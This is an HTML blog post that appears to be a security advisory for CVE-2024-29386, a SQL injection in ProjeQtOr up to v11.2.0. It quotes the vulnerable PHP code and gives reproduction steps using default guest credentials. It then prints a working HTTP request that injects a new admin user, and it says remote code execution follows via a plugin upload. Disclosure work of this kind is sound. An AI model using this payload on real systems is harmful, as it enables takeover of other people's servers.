<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="Projeqtor up to v11.2.0 has an SQL injection vulnerability via the component /view/criticalResourceExport.php that leads to privilege escalation and RCE">
    

    <!--Author-->
    
        <meta name="author" content="Anas Cherni">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="CVE-2024-29386"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="./n0s-CVEs"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>CVE-2024-29386 - ./n0s-CVEs</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 6.2.0"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a target="_blank" rel="noopener" href="https://anas-cherni.me">
                    Whoami
                </a>
            </li>
            
            <li class="menu-item">
                <a target="_blank" rel="noopener" href="https://blog.anas-cherni.me">
                    CTF Writeups
                </a>
            </li>
            
            <li class="menu-item">
                <a target="_blank" rel="noopener" href="https://cve.anas-cherni.me">
                    CVEs
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2024/04/04/CVE-2024-29386/">
                CVE-2024-29386
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2024-04-04</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h2 id="Advisory"><a href="#Advisory" class="headerlink" title="Advisory"></a>Advisory</h2><h3 id="Software-brief-introduction"><a href="#Software-brief-introduction" class="headerlink" title="Software brief introduction"></a>Software brief introduction</h3><p>ProjeQtOr is an Open Source project management software. </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ProjeQtOr">https://en.wikipedia.org/wiki/ProjeQtOr</a><br><a target="_blank" rel="noopener" href="https://www.projeqtor.org/en/product-en/downloads">https://www.projeqtor.org/en/product-en/downloads</a></p>
</blockquote>
<h3 id="Vulnerability-description"><a href="#Vulnerability-description" class="headerlink" title="Vulnerability description"></a>Vulnerability description</h3><p>Projeqtor up to v11.2.0 was discovered to contain a SQL injection vulnerability via the component <code>/view/criticalResourceExport.php</code>. Exploitation of this flow leads to privilege escalation by adding new user with known credentials and admin role and Remote code execution via plugin upload.</p>
<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p><code>model/Affectable.php</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">Affectable</span>  <span class="keyword">extends</span>  <span class="title">SqlElement</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span>  <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span>  <span class="title">tranformPlanningResult</span>(<span class="params"><span class="variable">$scale</span>, <span class="variable">$start</span>, <span class="variable">$end</span></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="variable">$resourceTeamAffection</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$resourceTeamAffRate</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$idResourceTeam</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$planWork</span>=<span class="keyword">new</span>  <span class="title class_">PlannedWork</span>();</span><br><span class="line"><span class="variable">$tmpAss</span>=<span class="keyword">new</span>  <span class="title class_">Assignment</span>();</span><br><span class="line"><span class="variable">$critPlannedWork</span>=<span class="string">&quot;idProject not in &quot;</span>.<span class="title class_">Project</span>::<span class="title function_ invoke__">getAdminitrativeProjectList</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$critPlannedWork</span>.=<span class="string">&quot; and workDate&gt;=&#x27;<span class="subst">$start</span>&#x27; and workDate&lt;=&#x27;<span class="subst">$end</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$lstPlanWork</span>=<span class="variable">$planWork</span>-&gt;<span class="title function_ invoke__">getSqlElementsFromCriteria</span>(<span class="literal">null</span>, <span class="literal">false</span>, <span class="variable">$critPlannedWork</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$loop</span>[<span class="string">&#x27;ideal&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&quot;real&quot;</span>=&gt;<span class="variable">$arrayRealWork</span>, <span class="string">&quot;planned&quot;</span>=&gt;<span class="variable">$arrayPlannedWork</span>);</span><br><span class="line"><span class="variable">$loop</span>[<span class="string">&#x27;real&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&quot;real&quot;</span>=&gt;<span class="variable">$arrayRealWork</span>, <span class="string">&quot;planned&quot;</span>=&gt;<span class="variable">$lstPlanWork</span>); <span class="comment">// PBER : Not sure, possibly to remove back to &quot;real&quot;=&gt;array()</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>view/CriticalResourceExport.php</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$scale</span> = <span class="title class_">RequestHandler</span>::<span class="title function_ invoke__">getValue</span>(<span class="string">&#x27;scaleCriticalResources&#x27;</span>);</span><br><span class="line"><span class="variable">$start</span> = <span class="title class_">RequestHandler</span>::<span class="title function_ invoke__">getDatetime</span>(<span class="string">&#x27;startDateCriticalResources&#x27;</span>);</span><br><span class="line"><span class="variable">$end</span> = <span class="title class_">RequestHandler</span>::<span class="title function_ invoke__">getDatetime</span>(<span class="string">&#x27;endDateCriticalResources&#x27;</span>);</span><br><span class="line"><span class="variable">$idProject</span> = <span class="title class_">RequestHandler</span>::<span class="title function_ invoke__">getId</span>(<span class="string">&#x27;idProjectCriticalResources&#x27;</span>);</span><br><span class="line"><span class="variable">$limitedRow</span> = <span class="title class_">RequestHandler</span>::<span class="title function_ invoke__">getNumeric</span>(<span class="string">&#x27;nbCriticalResourcesValue&#x27;</span>);</span><br><span class="line"><span class="title class_">Affectable</span>::<span class="title function_ invoke__">getCriticalResourcePlanningResult</span>();</span><br><span class="line"><span class="title class_">Affectable</span>::<span class="title function_ invoke__">drawCriticalProjectResourceList</span>(<span class="variable">$scale</span>, <span class="variable">$start</span>, <span class="variable">$end</span>, <span class="variable">$idProject</span>, <span class="variable">$limitedRow</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h3><ol start="0">
<li>Login with guest:guest</li>
<li>Send GET request to the path &#x2F;view&#x2F;criticalResourceExport.php?scaleCriticalResources&#x3D;a&amp;startDateCriticalResources&#x3D; Injection_Here  &amp;endDateCriticalResources&#x3D;Injection_Here</li>
</ol>
<h3 id="Proof-of-concept"><a href="#Proof-of-concept" class="headerlink" title="Proof of concept"></a>Proof of concept</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">## SQLi to create new user with admin Priv</span><br><span class="line">## After connecting to new admin acc, we upload a new plugin containing RCE php shell</span><br><span class="line"></span><br><span class="line">GET /view/criticalResourceExport.php?scaleCriticalResources=a&amp;startDateCriticalResources=2023-02-01&amp;endDateCriticalResources=2023-03-01&#x27;+%3b+insert+into+resource+values(&quot;4&quot;,&quot;lol&quot;,NULL,NULL,NULL,&quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;,1,0,1,0,0,NULL,NULL,NULL,NULL,1.00000,NULL,0,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,NULL,&quot;md5&quot;,1,NULL,&quot;2024-02-09&quot;,&quot;ab041450606933a7f4491fdc9bb9e2fd&quot;,0,NULL,NULL,NULL,NULL,0,0,0,NULL,NULL,0,0,NULL,NULL,0)+%3b+--+&#x27;%3b&amp;idProjectCriticalResources=1&amp;nbCriticalResourcesValue=1 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost/view/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: PHPSESSID=9p222uq7m4r7fvlurlpdo62s5i</span><br><span class="line">If-Modified-Since: Sun, 11 Feb 2024 13:38:47 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>


<h3 id="Timeline-DD-MM-YYYY"><a href="#Timeline-DD-MM-YYYY" class="headerlink" title="Timeline (DD-MM-YYYY)"></a>Timeline (DD-MM-YYYY)</h3><ul>
<li>10-01-2024: Vulnerability identified</li>
<li>14-02-2024: 1st vendor contact attempt via email</li>
<li>05-03-2024: 2nd vendor contact attempt via email</li>
<li>10-03-2024: 3rd vendor contact attempt via website forum</li>
<li>12-03-2024: CVE requested</li>
<li>24-03-2024: CVE assigned</li>
<li>04-04-2024: CVE request publication</li>
</ul>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>I discovered the issue during my journey at Mazars Cybersecurity as an application security consultant. The product owner was notified following their security policy via an email and public forum of the website but didn’t respond.</p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    CTF player, sharing the most interesting things i encounter. Application Securiy consultant @mazars Tunisia, Technical Director @securinets & INSAT student.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2024/04/04/CVE-2024-29386/">CVE-2024-29386</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2024/04/04/CVE-2024-29387/">CVE-2024-29387</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2024/01/19/CVE-2023-50694/">CVE-2023-50694</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2024/01/19/CVE-2023-50693/">CVE-2023-50693</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/n_zero_s">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:anas.cherni@insat.ucar.tn">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                     @Anas Cherni. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>